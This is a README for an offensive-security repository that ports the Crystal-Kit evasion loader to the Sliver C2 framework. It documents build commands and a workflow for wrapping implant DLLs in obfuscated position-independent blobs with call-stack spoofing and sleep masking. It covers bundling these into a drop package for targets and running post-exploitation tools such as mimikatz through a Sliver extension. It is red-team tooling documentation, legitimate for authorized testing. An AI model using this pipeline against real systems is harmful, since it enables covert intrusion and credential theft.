# crystal-kit-sliver

Crystal Palace evasion kit ported to [Sliver C2](https://sliver.sh).

This is the first public port of rasta-mouse's [Crystal-Kit](https://github.com/rasta-mouse/Crystal-Kit) (Cobalt Strike) to Sliver. It follows the same cross-C2 pattern proven by [Crystal-Kit-Xenon](https://github.com/nickswink/Crystal-Kit-Xenon) (Mythic).

- **License:** MIT — Copyright (c) 2026 Simone Licitra
- **Target:** Windows x64 only (upstream constraint)
- **Status:** verified end-to-end — Kali build pipeline + Windows 10 x64 FLARE-VM runtime. Sliver session established.

---

## What it does

Replaces Sliver's default reflective loader and post-ex execution path with [Crystal Palace](https://tradecraftgarden.org/) (Raphael Mudge, BSD). The result is a position-independent code (PICO) blob that bundles:

- ror13 hash-based API resolution (no plain `LoadLibrary` / `GetProcAddress`)
- IAT hooks on `VirtualAlloc` / `VirtualProtect` / `VirtualFree` / `LoadLibraryA`
- Draugr call stack spoofing during callbacks
- XOR sleep mask over the embedded DLL
- libtcg-based runtime obfuscation

The Sliver implant DLL (or any post-ex DLL) is XOR-masked inside the PICO and only unmasked in memory at execution time.

---

## Two use cases

### A — Implant evasion (PRIMARY)

The raw Sliver implant DLL is never executed directly on target. Instead it is wrapped with Crystal Palace into a PICO and delivered together with a stager (`run.x64.exe` from the Crystal Palace demo, BSD).

```
sliver-server generate --format shared → impl.dll
        │
        ▼
generate-implant.sh --dll impl.dll → sliver.crystal.bin  (~110 KB PICO)
        │
        ▼
bundle-implant.sh                  → drop.zip            (PICO + stager + README)
        │
        ▼ deliver to target
        ▼
Windows VM: run.x64.exe sliver.crystal.bin
        │
        ▼ Crystal Palace loader runs
        ▼ register .pdata → TLS callbacks → DllMain → StartW() → beacon goroutine → HTTP session
```

### B — Post-ex evasion (SECONDARY)

Once a session is active, run sensitive DLLs (recon, credential dumpers, etc.) through Crystal Palace via a Sliver Extension.

```
sliver > extensions install crystal-loader-0.1.0.tar.gz
sliver > crystal payload=mimikatz.pico.bin
```

The `crystal-loader.x64.dll` is a Sliver DLL Extension that allocates RWX memory, loads the PICO blob, and jumps to the Crystal Palace entrypoint.

---

## Repo layout

```
crystal-kit-sliver/
├── loader/              ← Reflective loader sources (Use case A) — verbatim from Crystal-Kit
├── postex-loader/       ← Post-ex loader sources (Use case B) — Crystal-Kit + Xenon patch
├── libtcg.x64.zip       ← Upstream binary dependency (kept in tree for build convenience)
└── sliver-glue/         ← Sliver-specific build glue
    ├── extension.json           Sliver Extension manifest
    ├── generate.sh              Wrap a post-ex DLL  → PICO (Use case B)
    ├── generate-implant.sh      Wrap a Sliver DLL   → PICO (Use case A)
    ├── bundle-implant.sh        Bundle PICO + stager into drop.zip
    ├── pack-extension.sh        Pack DLL + manifest into Sliver Extension tarball
    ├── Makefile                 make objects / package / clean
    └── wrapper/                 crystal-loader.c (BOF-compat DLL wrapper)

docs/
├── RUNBOOK.md           Step-by-step Kali → Windows lab procedure
├── PORTING_MAP.md       File-by-file mapping Crystal-Kit → this repo + literal diffs
└── TOOLCHAIN.md         Build prerequisites and pipeline details
```

---

## Quick build (Kali / Debian / Ubuntu)

```bash
# 1. Toolchain
sudo apt install -y mingw-w64 nasm default-jdk make zip git curl

# 2. Crystal Palace dist (BSD-3-Clause, Raphael Mudge)
mkdir -p external/crystalpalace
curl -fsSL https://tradecraftgarden.org/download/cpdist-latest.tgz \
   | tar -xz -C external/crystalpalace/
export CRYSTAL_PALACE_HOME=$(pwd)/external/crystalpalace/dist

# 3. Build everything
make -C crystal-kit-sliver/loader all
make -C crystal-kit-sliver/postex-loader all
make -C crystal-kit-sliver/sliver-glue/wrapper all
make -C crystal-kit-sliver/sliver-glue/wrapper smoketest

# 4. Use case A — wrap a Sliver implant
./crystal-kit-sliver/sliver-glue/generate-implant.sh --dll /path/to/sliver-impl.dll \
   crystal-kit-sliver/sliver-glue/build/sliver.crystal.bin
./crystal-kit-sliver/sliver-glue/bundle-implant.sh \
   crystal-kit-sliver/sliver-glue/build/sliver.crystal.bin \
   crystal-kit-sliver/sliver-glue/build/drop.zip

# 5. Use case B — wrap a post-ex DLL
./crystal-kit-sliver/sliver-glue/generate.sh /path/to/postex.dll /dev/null \
   crystal-kit-sliver/sliver-glue/build/postex.pico.bin
./crystal-kit-sliver/sliver-glue/pack-extension.sh
```

See `docs/RUNBOOK.md` for the full operator procedure (Sliver install, listener setup, target execution, troubleshooting).

---

## What is verified

| Item | Status | Evidence |
|---|---|---|
| All Crystal-Kit sources compile under MinGW 15.2 + NASM 3.01 | OK | `make all` clean, 8 `.o` + 1 `.bin` per loader |
| Xenon post-ex patches present | OK | `dfr "ror13"`, `_DLLARGS_` section, `dll_arguments` param in `DLL_PROCESS_ATTACH` |
| Crystal Palace CLI verified | OK | `./link <spec> <dll> <out.bin> [%KEY=value]` — positional, documented in `dist/README` |
| End-to-end PICO build (Use case A) | OK | 117 KB PICO produced from test DLL |
| End-to-end PICO build (Use case B) | OK | 111 KB PICO produced via `postex-loader/loader.spec` |
| Sliver Extension wrapper DLL builds | OK | 114 KB PE32+ exporting `go` symbol |
| Extension tarball packs correctly | OK | 37 KB tarball validated with `tar -tzf` |
| Operator drop bundle (PICO + stager) | OK | 182 KB zip with `run.x64.exe` + PICO + README |
| Runtime execution on Windows (Use case A) | OK | Sliver session established on Windows 10 x64 FLARE-VM via `run.x64.exe sliver-crystal.bin` |

---

## Dependencies

| Dependency | License | How to obtain | Bundled? |
|---|---|---|---|
| Crystal Palace (`crystalpalace.jar`, `link`, etc.) | BSD-3-Clause, (c) 2025 Raphael Mudge / AFF-WG | `curl -O https://tradecraftgarden.org/download/cpdist-latest.tgz` | No (`.gitignore` excludes `external/`) |
| `libtcg.x64.zip` | Upstream binary, license unstated (likely QEMU TCG-derived) | Copied from upstream Crystal-Kit repo | Yes, kept in tree for build convenience |
| Sliver C2 | GPLv3 | <https://sliver.sh> | No — runtime dependency only |
| MinGW-w64 + NASM | GPL-compatible | `apt install` or `brew install` | No |

This repository does NOT redistribute `crystalpalace.jar`. The build pipeline fetches it externally and references it via the `CRYSTAL_PALACE_HOME` environment variable.

---

## Attribution

See [`NOTICE.md`](NOTICE.md) for the full list of upstream copyrights and licenses. Brief summary:

- **rasta-mouse** — Crystal-Kit (MIT) — base reflective loader, postex loader, spec files
- **nickswink** — Crystal-Kit-Xenon (MIT) — cross-C2 patch template (smart pointers removal + `dll_args` section)
- **Raphael Mudge / AFF-WG** — Crystal Palace (BSD-3-Clause) — linker and PIC tooling
- **TrustedSec** — COFFLoader (BSD-3-Clause) — BOF compatibility layer (`beacon.h`, `beacon_compatibility.c/h`)
- **BishopFox** — Sliver C2 (GPLv3) — target framework

---

## Roadmap

- [x] 1 — Audit upstream repos + extract diff between Crystal-Kit and Crystal-Kit-Xenon
- [x] 2 — Toolchain documentation + repository scaffold
- [x] 3 — File-by-file porting map with literal diffs (`docs/PORTING_MAP.md`)
- [x] 4 — Sources copied + Xenon patches applied + LICENSE + NOTICE
- [x] 5 — `sliver-glue/` glue scripts and Extension manifest
- [x] 6a — DLL wrapper written, built (MinGW 15.2), packaged, smoke test shellcode
- [x] 6b — Crystal Palace CLI verified, real PICO built end-to-end
- [x] 6c — Dual use case A/B: `generate-implant.sh` + `bundle-implant.sh`
- [x] 6d — Runtime test on Windows x64 lab — Use case A verified (Sliver session established on FLARE-VM)

---

## Disclaimer

Offensive security tooling intended for authorized red team engagements, lab research, and education. Use only in environments where you have written authorization. The author assumes no responsibility for misuse.
